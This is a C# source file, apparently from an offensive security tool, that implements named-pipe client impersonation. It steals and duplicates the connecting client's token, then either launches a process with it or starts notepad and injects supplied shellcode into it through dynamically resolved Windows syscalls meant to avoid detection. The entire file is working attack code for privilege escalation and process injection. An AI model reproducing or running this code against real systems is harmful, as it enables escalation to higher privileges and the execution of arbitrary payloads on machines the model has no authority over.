using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;

namespace SharpNamedPipePTH
{
    class PipeServerImpersonate
    {

        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        public static uint PIPE_ACCESS_DUPLEX = 0x00000003;
        public static uint PIPE_READMODE_BYTE = 0x00000000;
        public static uint PIPE_TYPE_BYTE = 0x00000000;
        public static uint PIPE_WAIT = 0x00000000;
        public static uint TOKEN_ALL_ACCESS = 0xF01FF;
        public static uint TOKENUSER = 1;
        public static uint SECURITY_IMPERSONATION = 2;
        public static uint TOKEN_PRIMARY = 1;

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            CREATE_NO_WINDOW = 0x08000000,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }
        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly = 0
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROFILEINFO
        {
            public int dwSize;
            public int dwFlags;
            [MarshalAs(UnmanagedType.LPTStr)]
            public String lpUserName;
            [MarshalAs(UnmanagedType.LPTStr)]
            public String lpProfilePath;
            [MarshalAs(UnmanagedType.LPTStr)]
            public String lpDefaultPath;
            [MarshalAs(UnmanagedType.LPTStr)]
            public String lpServerName;
            [MarshalAs(UnmanagedType.LPTStr)]
            public String lpPolicyPath;
            public IntPtr hProfile;
        }


        // Imports, feel free porting them to D/Invoke or Syscalls :P

        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateNamedPipeW(string pipeName, int openMode, int pipeMode, int maxInstances, int outBufferSize, int inBufferSize, int defaultTimeout, ref SECURITY_ATTRIBUTES securityAttributes);


        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentThread();

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();

        [DllImport("kernel32.dll")]
        public static extern IntPtr WaitForSingleObject(IntPtr handle, int dwMilliseconds);

        [DllImport("Advapi32.dll")]
        private static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(
           string StringSecurityDescriptor,
           uint StringSDRevision,
           out IntPtr SecurityDescriptor,
           IntPtr SecurityDescriptorSize);


        // DInvoke Stuff

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate SharpNamedPipePTH.DynamicInvokation.Native.NTSTATUS NtOpenProcess(
    ref IntPtr ProcessHandle,
    uint DesiredAccess,
    ref OBJECT_ATTRIBUTES ObjectAttributes,
    ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate SharpNamedPipePTH.DynamicInvokation.Native.NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate SharpNamedPipePTH.DynamicInvokation.Native.NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate SharpNamedPipePTH.DynamicInvokation.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            ref uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate SharpNamedPipePTH.DynamicInvokation.Native.NTSTATUS NtCreateThreadEx(
            out IntPtr threadHandle,
            SharpNamedPipePTH.DynamicInvokation.Win32.WinNT.ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        public static int ProcByName(string processname)
        {
            Process[]
            processlist = Process.GetProcesses();
            foreach (Process theprocess in processlist)
            {
                if (theprocess.ProcessName == "notepad")
                {
                    return theprocess.Id;
                }
            }
            return 0;
        }

        public static void ImpersonateClient(string PipeName, string Binary, byte[] shellcodebytes, string args)
        {
            // some code from https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/PrintSpoofer.NET/Program.cs, some from https://github.com/BeichenDream/BadPotato/blob/master/Program.cs

            string pipename = PipeName;
            string binary = Binary;

            SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();

            // Create our named pipe
            pipename = string.Format("\\\\.\\pipe\\{0}", pipename);
            Console.WriteLine("Create Named Pipe: " + pipename);
            ConvertStringSecurityDescriptorToSecurityDescriptor("D:(A;OICI;GA;;;WD)", 1, out securityAttributes.lpSecurityDescriptor, IntPtr.Zero);

            IntPtr hPipe = CreateNamedPipeW(string.Format("\\\\.\\{0}", pipename), 0x00000003 | 0x40000000, 0x00000000, 10, 2048, 2048, 0, ref securityAttributes);
            if (hPipe != IntPtr.Zero)
            {
                // Connect to our named pipe and wait for another client to connect

                bool result = ConnectNamedPipe(hPipe, IntPtr.Zero);

                if (result)
                {
                    Console.WriteLine("Connect success!");
                }
                else
                {
                    Console.WriteLine("Connect fail!");
                    return;
                }

                // Impersonate the token of the incoming connection
                result = ImpersonateNamedPipeClient(hPipe);
                if (result)
                {
                    Console.WriteLine("Successfully impersonated client!");
                }
                else
                {
                    Console.WriteLine("Impersonation failed!");
                    return;
                }

                // Open a handle on the impersonated token
                IntPtr tokenHandle;
                result = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, out tokenHandle);

                if (result)
                {
                    Console.WriteLine("OpenThreadToken succeeded!");
                }
                else
                {
                    Console.WriteLine("OpenThreadToken failed!");
                    return;
                }

                // Duplicate the stolen token
                IntPtr sysToken = IntPtr.Zero;
                DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION, TOKEN_PRIMARY, out sysToken);

                if (result)
                {
                    Console.WriteLine("DuplicateTokenEx succeeded!");
                }
                else
                {
                    Console.WriteLine("DuplicateTokenEx failed!");
                    return;
                }

                // Get the impersonated identity and revert to self to ensure we have impersonation privs
                String name = WindowsIdentity.GetCurrent().Name;
                Console.WriteLine($"Impersonated user is: {name}.");

                if (shellcodebytes != null)
                {

                    RevertToSelf();

                    PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
                    STARTUPINFO sInfo = new STARTUPINFO();
                    sInfo.cb = Marshal.SizeOf(sInfo);

                    binary = @"C:\windows\system32\notepad.exe";

                    bool output = CreateProcessWithTokenW(sysToken, 0, null, binary, CreationFlags.NewConsole, IntPtr.Zero, null, ref sInfo, out pInfo);
                    Console.WriteLine($"Executed '{binary}' to deploy shellcode in that process!");

                    int ProcID = ProcByName("notepad");

                    var shellcode = shellcodebytes;

                    // NtOpenProcess
                    IntPtr stub = SharpNamedPipePTH.DynamicInvokation.DynamicGeneric.GetSyscallStub("NtOpenProcess");
                    NtOpenProcess ntOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));

                    IntPtr hProcess = IntPtr.Zero;
                    OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();

                    CLIENT_ID ci = new CLIENT_ID
                    {
                        UniqueProcess = (IntPtr)(ProcID)
                    };

                    SharpNamedPipePTH.DynamicInvokation.Native.NTSTATUS statusresult;

                    statusresult = ntOpenProcess(
                        ref hProcess,
                        0x001F0FFF,
                        ref oa,
                        ref ci);

                    // NtAllocateVirtualMemory
                    stub = SharpNamedPipePTH.DynamicInvokation.DynamicGeneric.GetSyscallStub("NtAllocateVirtualMemory");
                    NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));

                    IntPtr baseAddress = IntPtr.Zero;
                    IntPtr regionSize = (IntPtr)shellcodebytes.Length;

                    statusresult = ntAllocateVirtualMemory(
                        hProcess,
                        ref baseAddress,
                        IntPtr.Zero,
                        ref regionSize,
                        0x1000 | 0x2000,
                        0x04);

                    // NtWriteVirtualMemory
                    stub = SharpNamedPipePTH.DynamicInvokation.DynamicGeneric.GetSyscallStub("NtWriteVirtualMemory");
                    NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));

                    var buffer = Marshal.AllocHGlobal(shellcodebytes.Length);
                    Marshal.Copy(shellcodebytes, 0, buffer, shellcodebytes.Length);

                    uint bytesWritten = 0;

                    statusresult = ntWriteVirtualMemory(
                        hProcess,
                        baseAddress,
                        buffer,
                        (uint)shellcodebytes.Length,
                        ref bytesWritten);

                    // NtProtectVirtualMemory
                    stub = SharpNamedPipePTH.DynamicInvokation.DynamicGeneric.GetSyscallStub("NtProtectVirtualMemory");
                    NtProtectVirtualMemory ntProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

                    uint oldProtect = 0;

                    statusresult = ntProtectVirtualMemory(
                        hProcess,
                        ref baseAddress,
                        ref regionSize,
                        0x20,
                        ref oldProtect);

                    // NtCreateThreadEx
                    stub = SharpNamedPipePTH.DynamicInvokation.DynamicGeneric.GetSyscallStub("NtCreateThreadEx");
                    NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));

                    IntPtr hThread = IntPtr.Zero;

                    statusresult = ntCreateThreadEx(
                        out hThread,
                        SharpNamedPipePTH.DynamicInvokation.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                        IntPtr.Zero,
                        hProcess,
                        baseAddress,
                        IntPtr.Zero,
                        false,
                        0,
                        0,
                        0,
                        IntPtr.Zero);

                }
                else
                {
                    
                                        
                    RevertToSelf();

                    // Spawn a new process with the duplicated token, a desktop session, and the created profile
                    PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
                    STARTUPINFO sInfo = new STARTUPINFO();
                    
                    sInfo.cb = Marshal.SizeOf(sInfo);

                    bool output = CreateProcessWithTokenW(sysToken, 0, binary, args, CreationFlags.NewConsole, IntPtr.Zero, null, ref sInfo, out pInfo);
                    Console.WriteLine($"Executed '{binary}' with impersonated token!");
                }
            }
        }
    }
}
